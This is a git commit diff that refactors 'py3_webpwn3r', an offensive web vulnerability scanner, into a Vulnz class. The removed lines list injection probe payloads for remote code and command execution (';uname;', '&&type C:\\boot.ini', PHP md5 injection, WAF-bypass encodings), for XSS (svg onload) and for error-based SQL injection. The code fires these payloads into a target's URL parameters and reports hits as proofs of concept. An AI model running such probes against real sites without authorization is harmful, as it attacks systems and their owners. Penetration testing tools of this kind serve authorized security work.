4b0d43aa7d49573f9ea974e15b412ad129c903cb
mattia allegro <mattia.allegro@yahoo.it>
2024-08-23 18:36:33 +0200

    Replace all old methods in one class Vulnz

--- py3_webpwn3r/core/vulnz.py
+++ py3_webpwn3r/core/vulnz.py
@@ -14,114 +14,162 @@
 # You should have received a copy of the GNU Affero General Public License
 # along with this program. If not, see <http://www.gnu.org/licenses/>.
 
+import logging
 import re
 import time
-import urllib.request
+from urllib.request import urlopen
 
 from costants import (
-    get_green,
-    get_blue,
-    get_bold,
-    get_red,
-    get_end,
+    ANSI_BLUE,
+    ANSI_BOLD,
+    ANSI_END,
+    ANSI_GREEN,
+    ANSI_RED,
+    HTTP_HEADER_SERVER,
+    HTTP_HEADER_SIG,
+    PAYLOADS_AND_CHECK,
 )
-from headers import (
-    useragent,
-    headers_reader,
-)
+from user_agent import useragent
+
+logger = logging.getLogger(__name__)
 
 
-def main_function(url, payloads, check):
-    # This function is going to split the url and try to append payloads
-    # in every parameter value.
-    opener = urllib.request.urlopen(url)
-    vuln = 0
-    if opener.code == 999:
-        # Detecting the WebKnight WAF from the StatusCode.
-        print(get_red + " [~] WebKnight WAF Detected!" + get_end)
-        print(get_red + " [~] Delaying 3 seconds between every request" + get_end)
-        time.sleep(3)
-    for params in url.split("?")[1].split("&"):
-        for payload in payloads:
-            bugs = url.replace(params, params + str(payload).strip())
-            print(bugs)
-            request = useragent.open(bugs)
-            html = request.readlines()
-            for line in html:
-                checker = re.findall(check, line)
-                if len(checker) != 0:
-                    print(get_red + " [*] Payload Found . . ." + get_end)
-                    print(get_red + " [*] Payload: ", payload + get_end)
-                    print(get_green + " [!] Code Snippet: " + get_end + line.strip())
-                    print(get_blue + " [*] POC: " + get_end + bugs)
-                    print(get_green + " [*] Happy Exploitation :D" + get_end)
-                    vuln += 1
-    if vuln == 0:
-        print(get_green + " [!] Target is not vulnerable!" + get_end)
-    else:
-        print(
-            get_blue + " [!] Congratulations you've found %i bugs :-) " % vuln + get_end
+class Vulnz:
+    def __init__(self, url: str):
+        """Initializes a Vulnz instance.
+
+        Args:
+            url (str): Add me.
+        """
+        self._message = ""
+        self.url = url
+
+    def write_message(self, message: str | list, color: str | None = None) -> None:
+        if isinstance(message, str):
+            msg = f"{color}{message}{ANSI_END}" if color else f" {message}{ANSI_END}"
+            self._message += msg
+            logger.info(msg)
+            print(msg)
+        elif isinstance(message, list):
+            for msg in message:
+                self.write_message(msg, color)
+        else:
+            self.write_message("[!] Wrong type msg")
+
+    def _main(self, payload_key: str) -> None:
+        """Main function for Vulnz.
+
+        Args:
+            payload_key (str): Key for payload.
+        """
+        opener = urlopen(self.url)
+        if opener.code == 999:
+            # Detecting the WebKnight WAF from the StatusCode.
+            self.write_message(
+                [
+                    "[~] WebKnight WAF Detected!",
+                    "[~] Delaying 3 seconds between every request",
+                ],
+                ANSI_RED,
+            )
+            time.sleep(3)
+        vuln = 0
+        payloads_with_check = PAYLOADS_AND_CHECK.get(payload_key)
+        if not payloads_with_check:
+            self.write_message(f"[!] Payload key not correct", ANSI_RED)
+            return
+
+        # Used re.I to fix the case-sensitive issues like "payload" and "PAYLOAD".
+        check = re.compile(payloads_with_check["check"], re.I)
+
+        urls_params = self.url.split("?")
+        if len(urls_params) <= 1:
+            self.write_message(
+                [
+                    f"[Warning] {self.url} is not a valid URL, no query call is present",
+                    "[Warning] You should write a Full URL - e.g. https://site.com/page.php?id=value",
+                ],
+                ANSI_RED,
+            )
+            return
+
+        for params in urls_params[1].split("&"):
+            for payload in payloads_with_check["payloads"]:
+                bugs = self.url.replace(params, params + str(payload).strip())
+                request = useragent.open(bugs)
+                html = request.readlines()
+                for line in html:
+                    line_as_str = str(line)
+                    checker = re.findall(check, line_as_str)
+                    if len(checker) != 0:
+                        self.write_message(f"[*] Payload: {payload}", ANSI_RED)
+                        self.write_message(
+                            f"[!] Code Snippet: {line.strip()}", ANSI_GREEN
+                        )
+                        self.write_message(f"[*] POC: {bugs}", ANSI_BLUE)
+                        vuln += 1
+        if vuln == 0:
+            self.write_message("[!] Target is not vulnerable!", ANSI_GREEN)
+        else:
+            self.write_message(
+                f"[!] Congratulations you've found {vuln} bugs :-) Happy Exploitation :D",
+                ANSI_BLUE,
+            )
+
+    def get_server_headers(self):
+        """This function will print the server headers such as WebServer OS & Version"""
+
+        self.write_message(["[!] Fingerprinting the backend Technologies."], ANSI_BOLD)
+        url_data = urlopen(self.url)
+        if url_data.code == 200:
+            self.write_message("[!] Status code: 200 OK", ANSI_GREEN)
+        if url_data.code == 404:
+            self.write_message(
+                "[!] Page was not found! Please check the URL \n", ANSI_RED
+            )
+            exit()
+        _server = url_data.headers.get(HTTP_HEADER_SERVER)
+        _host = self.url.split("/")[2]
+        self.write_message(
+            [f"[!] Host: {_host}", f"[!] WebServer: {_server}"], ANSI_GREEN
         )
+        for _, item in url_data.headers.items():
+            for powered in item:
+                if HTTP_HEADER_SIG in item:
+                    self.write_message(f"[!] {str(powered).strip()}", ANSI_GREEN)
 
+    def rce_vulnt(self) -> None:
+        """Call up detection payloads to get for RCE vulnerabilities."""
 
-# Here stands the vulnerabilities functions and detection payloads.
-def rce_func(url):
-    headers_reader(url)
-    print(get_bold + " [!] Now Scanning for Remote Code/Command Execution " + get_end)
-    print(get_blue + " [!] Covering Linux & Windows Operating Systems " + get_end)
-    print(get_blue + " [!] Please wait ...." + get_end)
-    # Remote Code Injection Payloads
-    payloads = [";${@print(md5(zigoo0))}", ';${@print(md5("zigoo0"))}']
-    # Below is the Encrypted Payloads to bypass some Security Filters & WAF's
-    payloads += [
-        "%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%2529%257D%253B"
-    ]
-    # Remote Command Execution Payloads
-    payloads += [";uname;", "&&dir", "&&type C:\\boot.ini", ";phpinfo();", ";phpinfo"]
-    # used re.I to fix the case sensitve issues like "payload" and "PAYLOAD".
-    check = re.compile(
-        "51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot",
-        re.I,
-    )
-    main_function(url, payloads, check)
+        self.write_message(
+            "[!] Now Scanning for Remote Code/Command Execution", ANSI_BOLD
+        )
+        self.write_message(
+            "[!] Covering Linux & Windows Operating Systems, please wait...",
+            ANSI_BLUE,
+        )
+        self._main("rce")
 
+    def xss_vulnt(self) -> None:
+        """Call up detection payloads to get for XSS vulnerabilities."""
 
-def xss_func(url):
-    print(get_bold + "\n [!] Now Scanning for XSS " + get_end)
-    print(get_blue + " [!] Please wait ...." + get_end)
-    # Payload zigoo="css();" added for XSS in <a href TAG's
-    payloads = [
-        "%27%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb",
-        "%78%22%78%3e%78",
-    ]
-    payloads += [
-        "%22%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb",
-        "zigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb",
-    ]
-    check = re.compile("zigoo0<svg|x>x", re.I)
-    main_function(url, payloads, check)
+        self.write_message("[!] Now Scanning for Cross-site scripting", ANSI_BOLD)
+        self.write_message("[!] Please wait...", ANSI_BLUE)
+        self._main("xss")
 
+    def error_based_sqli_vulnt(self) -> None:
+        """Call up detection payloads to get for Error-based SQLi."""
 
-def error_based_sqli_func(url):
-    print(get_bold + "\n [!] Now Scanning for Error Based SQL Injection " + get_end)
-    print(
-        get_blue
-        + " [!] Covering MySQL, Oracle, MSSQL, MSACCESS & PostGreSQL Databases "
-        + get_end
-    )
-    print(get_blue + " [!] Please wait ...." + get_end)
-    # Yeah! let's bug the query :D :D \o/
-    # Payload = 12345'"\'\");|]*{%0d%0a<%00>%bf%27'
-    # added chinese char to the SQLI payloads to bypass mysql_real_escape_*
-    payloads = [
-        "3'",
-        "3%5c",
-        "3%27%22%28%29",
-        "3'><",
-        "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27",
-    ]
-    check = re.compile(
-        "Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error",
-        re.I,
-    )
-    main_function(url, payloads, check)
+        self.write_message("[!] Now Scanning for Error Based SQL Injection", ANSI_BOLD)
+        self.write_message(
+            "[!] Covering MySQL, Oracle, MSSQL, MSACCESS & PostGreSQL Databases, please wait...",
+            ANSI_BLUE,
+        )
+        self._main("error-based-sqli")
+
+    def call_all_detection_payloads(self) -> None:
+        """Call up detection payloads to get for all payloads."""
+
+        self.rce_vulnt()
+        self.xss_vulnt()
+        self.error_based_sqli_vulnt()
